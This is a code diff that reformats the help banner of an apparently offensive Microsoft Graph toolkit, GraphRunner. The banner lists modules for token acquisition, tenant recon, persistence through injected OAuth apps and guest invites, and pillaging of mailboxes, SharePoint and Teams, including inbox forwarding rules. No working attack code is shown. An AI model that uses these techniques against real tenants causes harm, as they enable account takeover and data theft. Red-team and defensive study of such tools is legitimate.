-Invoke-AutoTokenRefresh`t-`t Refresh tokens at an interval.
-    "
-    Write-Host -ForegroundColor green "----------------- Recon & Enumeration Modules -----------------"
-    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
-    Write-Host -ForegroundColor green "Invoke-GraphRecon`t`t-`t Performs general recon for org info, user settings, directory sync settings, etc
-Invoke-DumpCAPS`t`t`t-`t Gets conditional access policies
-Invoke-DumpApps`t`t`t-`t Gets app registrations and external enterprise apps along with consent and scope info
-Get-AzureADUsers`t`t-`t Gets user directory
-Get-SecurityGroups`t`t-`t Gets security groups and members
-Get-UpdatableGroups`t`t-`t Gets groups that may be able to be modified by the current user
-Get-DynamicGroups`t`t-`t Finds dynamic groups and displays membership rules
-Get-SharePointSiteURLs`t`t-`t Gets a list of SharePoint site URLs visible to the current user
-Invoke-GraphOpenInboxFinder`t-`t Checks each user’s inbox in a list to see if they are readable
-Get-TenantID`t`t`t-`t Retreives the tenant GUID from the domain name
-    "
-    Write-Host -ForegroundColor green "--------------------- Persistence Modules ---------------------"
-    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
-    Write-Host -ForegroundColor green "Invoke-InjectOAuthApp`t`t-`t Injects an app registration into the tenant
-Invoke-SecurityGroupCloner`t-`t Clones a security group while using an identical name and member list but can inject another user as well
-Invoke-InviteGuest`t`t-`t Invites a guest user to the tenant
-Invoke-AddGroupMember`t`t-`t Adds a member to a group
-    "
-    Write-Host -ForegroundColor green "----------------------- Pillage Modules -----------------------"
-    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
-    Write-Host -ForegroundColor green "Invoke-SearchSharePointAndOneDrive -`t Search across all SharePoint sites and OneDrive drives visible to the user
-Invoke-ImmersiveFileReader`t-`t Open restricted files with the immersive reader
-Invoke-SearchMailbox`t`t-`t Has the ability to do deep searches across a user’s mailbox and can export messages
-Invoke-SearchTeams`t`t-`t Can search all Teams messages in all channels that are readable by the current user.
-Invoke-SearchUserAttributes`t-`t Search for terms across all user attributes in a directory
-Get-Inbox`t`t`t-`t Gets inbox items
-Invoke-CreateInboxForwardingRule -`t Creates an inbox forwarding rule that forwards all emails matching a specified term to an email address. 
-Get-TeamsChat`t`t`t-`t Downloads full Teams chat conversations
-    "
-    Write-Host -ForegroundColor green "-------------------- Teams Modules -------------------"
-    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
-    Write-Host -ForegroundColor green "Get-TeamsApps`t`t`t-`t This module enumerates all accessible Teams chat channel and grabs the URL for all installed apps in side each channel.
-Get-TeamsChannels`t`t-`t This module enumerates all accessible teams and the channels a user has access to. 
-Find-ChannelEmails`t`t-`t This module enumerates all accessible teams and the channels looking for any email addresses assoicated with them. 
-Get-ChannelUsersEnum`t`t-`t This module enumerates a defined channel to see how many people are in a channel and who they are.
-Get-ChannelEmail`t`t-`t This module enumerates a defined channel for an email address and sets the sender type to Anyone. If there is no email address create one and sets the sender type to Anyone.
-Get-Webhooks`t`t`t-`t This module enumerates all accessible channels looking for any webhooks and their configuration information, including its the url.
-Create-Webhook`t`t`t-`t This module creates a webhook in a defined channel and provides the URL.
-Send-TeamsMessage`t`t-`t This module sends a message using Microsoft Team's webhooks, without needing any authentication
-    "
-    Write-Host -ForegroundColor green "--------------------- GraphRunner Module ----------------------"
-    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
-    Write-Host -ForegroundColor green "Invoke-GraphRunner`t`t-`t Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams."
+    Write-Host -ForegroundColor Green "-------------------- Authentication Modules -------------------"
+    Write-Host -ForegroundColor Green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor Green "Get-GraphTokens`t`t`t-`t Authenticate as a user to Microsoft Graph"
+    Write-Host -ForegroundColor Green "Invoke-RefreshGraphTokens`t-`t Use a refresh token to obtain new access tokens"
+    Write-Host -ForegroundColor Green "Get-AzureAppTokens`t`t-`t Complete OAuth flow as an app to obtain access tokens"
+    Write-Host -ForegroundColor Green "Invoke-RefreshAzureAppTokens`t-`t Use a refresh token and app credentials to refresh a token"
+    Write-Host -ForegroundColor Green "Invoke-AutoTokenRefresh`t-`t Refresh tokens at an interval."
 
-    Write-Host -ForegroundColor green "-------------------- Supplemental Modules ---------------------"
-    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
-    Write-Host -ForegroundColor green "Invoke-DeleteOAuthApp`t`t-`t Delete an OAuth App
-Invoke-DeleteGroup`t`t-`t Delete a group
-Invoke-RemoveGroupMember`t-`t Module for removing users/members from groups
-Invoke-DriveFileDownload`t-`t Has the ability to download single files from as the current user.
-Invoke-CheckAccess`t`t-`t Check if tokens are valid
-Invoke-AutoOAuthFlow`t`t-`t Automates OAuth flow by standing up a web server and listening for auth code
-Invoke-HTTPServer`t`t-`t A basic web server to use for accessing the emailviewer that is output from Invoke-SearchMailbox
-Invoke-BruteClientIDAccess`t-`t Test different CLientID's against MSGraph to determine permissions
-Invoke-ImportTokens`t`t-`t Import tokens from other tools for use in GraphRunner
-Get-UserObjectID`t`t-`t Retrieves an object ID for a user
-    "
-    Write-Host -ForegroundColor green ("=" * 80)
-    Write-Host -ForegroundColor green '[*] For help with individual modules run Get-Help <module name> -detailed'
-    Write-Host -ForegroundColor green '[*] Example: Get-Help Invoke-InjectOAuthApp -detailed'
+    Write-Host -ForegroundColor Green "----------------- Recon & Enumeration Modules -----------------"
+    Write-Host -ForegroundColor Green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor Green "Invoke-GraphRecon`t`t-`t Performs general recon for org info, user settings, directory sync settings, etc"
+    Write-Host -ForegroundColor Green "Invoke-DumpCAPS`t`t`t-`t Gets conditional access policies"
+    Write-Host -ForegroundColor Green "Invoke-DumpApps`t`t`t-`t Gets app registrations and external enterprise apps along with consent and scope info"
+    Write-Host -ForegroundColor Green "Get-AzureADUsers`t`t-`t Gets user directory"
+    Write-Host -ForegroundColor Green "Get-DirectoryRoles`t`t-`t Gets activated directory roles and their members"
+    Write-Host -ForegroundColor Green "Get-SecurityGroups`t`t-`t Gets security groups and members"
+    Write-Host -ForegroundColor Green "Get-UpdatableGroups`t`t-`t Gets groups that may be able to be modified by the current user"
+    Write-Host -ForegroundColor Green "Get-DynamicGroups`t`t-`t Finds dynamic groups and displays membership rules"
+    Write-Host -ForegroundColor Green "Get-SharePointSiteURLs`t`t-`t Gets a list of SharePoint site URLs visible to the current user"
+    Write-Host -ForegroundColor Green "Invoke-GraphOpenInboxFinder`t-`t Checks each user's inbox in a list to see if they are readable"
+    Write-Host -ForegroundColor Green "Find-PermissiveCalendars`t-`t Finds calendars shared more permissively than free/busy visibility"
+    Write-Host -ForegroundColor Green "Get-TenantID`t`t`t-`t Retrieves the tenant GUID from the domain name"
+
+    Write-Host -ForegroundColor Green "--------------------- Persistence Modules ---------------------"
+    Write-Host -ForegroundColor Green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor Green "Invoke-InjectOAuthApp`t`t-`t Injects an app registration into the tenant"
+    Write-Host -ForegroundColor Green "Invoke-SecurityGroupCloner`t-`t Clones a security group while using an identical name and member list but can inject another user as well"
+    Write-Host -ForegroundColor Green "Invoke-InviteGuest`t`t-`t Invites a guest user to the tenant"
+    Write-Host -ForegroundColor Green "Invoke-AddGroupMember`t`t-`t Adds a member to a group"
+    Write-Host -ForegroundColor Green "Invoke-CreateInboxForwardingRule -`t Creates an inbox forwarding rule that forwards all emails matching a specified term to an email address." 
+
+    Write-Host -ForegroundColor Green "----------------------- Pillage Modules -----------------------"
+    Write-Host -ForegroundColor Green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor Green "Invoke-SearchSharePointAndOneDrive`t-`t Search across all SharePoint sites and OneDrive drives visible to the user"
+    Write-Host -ForegroundColor Green "Invoke-ImmersiveFileReader`t-`t Open restricted files with the immersive reader"
+    Write-Host -ForegroundColor Green "Invoke-SearchMailbox`t`t-`t Deep searches across a user's mailbox and can export messages"
+    Write-Host -ForegroundColor Green "Invoke-SearchTeams`t`t-`t Search all Teams messages in all channels that are readable by the current user"
+    Write-Host -ForegroundColor Green "Invoke-SearchUserAttributes`t-`t Search for terms across all user attributes in a directory"
+    Write-Host -ForegroundColor Green "Get-Inbox`t`t`t-`t Gets inbox items"
+    Write-Host -ForegroundColor Green "Get-TeamsChat`t`t`t-`t Downloads full Teams chat conversations"
+
+    Write-Host -ForegroundColor Green "-------------------- Teams Modules ----------------------------"
+    Write-Host -ForegroundColor Green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor Green "Get-TeamsApps`t`t`t-`t Enumerates Teams chat channels and grabs URLs of installed apps"
+    Write-Host -ForegroundColor Green "Get-TeamsChannels`t`t-`t Enumerates all accessible teams and channels"
+    Write-Host -ForegroundColor Green "Find-ChannelEmails`t`t-`t Looks for any email addresses associated with teams/channels"
+    Write-Host -ForegroundColor Green "Get-ChannelUsersEnum`t`t-`t Enumerates a channel's user list"
+    Write-Host -ForegroundColor Green "Get-ChannelEmail`t`t-`t Checks/creates a channel email address and sets sender permissions"
+    Write-Host -ForegroundColor Green "Get-Webhooks`t`t`t-`t Finds webhooks in channels and their configurations"
+    Write-Host -ForegroundColor Green "Create-Webhook`t`t`t-`t Creates a webhook in a channel and provides the URL"
+    Write-Host -ForegroundColor Green "Send-TeamsMessage`t`t-`t Sends a message via Teams webhook (no auth required)"
+
+    Write-Host -ForegroundColor Green "--------------------- GraphRunner Module ----------------------"
+    Write-Host -ForegroundColor Green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor Green "Invoke-GraphRunner`t`t-`t Runs multiple recon and pillage modules and searches using default_detectors.json"
+
+    Write-Host -ForegroundColor Green "-------------------- Supplemental Modules ---------------------"
+    Write-Host -ForegroundColor Green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor Green "Invoke-DeleteOAuthApp`t`t-`t Delete an OAuth App"
+    Write-Host -ForegroundColor Green "Invoke-DeleteGroup`t`t-`t Delete a group"
+    Write-Host -ForegroundColor Green "Invoke-RemoveGroupMember`t-`t Remove users/members from groups"
+    Write-Host -ForegroundColor Green "Invoke-DriveFileDownload`t-`t Download single files as the current user"
+    Write-Host -ForegroundColor Green "Invoke-CheckAccess`t`t-`t Check if tokens are valid"
+    Write-Host -ForegroundColor Green "Invoke-AutoOAuthFlow`t`t-`t Automates OAuth flow via local web server"
+    Write-Host -ForegroundColor Green "Invoke-HTTPServer`t`t-`t Basic web server for viewing SearchMailbox output"
+    Write-Host -ForegroundColor Green "Invoke-BruteClientIDAccess`t-`t Tests various ClientIDs against MS Graph"
+    Write-Host -ForegroundColor Green "Invoke-ImportTokens`t`t-`t Import tokens from other tools into GraphRunner"
+    Write-Host -ForegroundColor Green "Get-UserObjectID`t`t-`t Retrieves a user's object ID"
+
+    Write-Host -ForegroundColor Green ("=" * 80)
+    Write-Host -ForegroundColor Green '[*] For help with individual modules run Get-Help <module name> -Detailed'
+    Write-Host -ForegroundColor Green '[*] Example: Get-Help Invoke-InjectOAuthApp -Detailed'
 }
